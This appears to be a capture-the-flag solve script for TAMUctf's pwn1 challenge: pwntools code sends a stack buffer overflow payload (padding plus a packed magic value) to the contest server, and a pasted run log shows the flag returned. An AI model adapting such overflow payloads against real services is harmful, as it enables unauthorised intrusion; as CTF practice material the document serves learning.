from pwn import *

p = remote("pwn.ctf.tamu.edu", 4321)

p.sendlineafter("secret?\n", "A"*23 + p32(0xF007BA11))

p.interactive()

'''
shgroup@SH-Group:/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn1$ python solve.py
[+] Opening connection to pwn.ctf.tamu.edu on port 4321: Done
[*] Switching to interactive mode
How did you figure out my secret?!
gigem{H0W_H4RD_1S_TH4T?}

[*] Got EOF while reading in interactive
$
'''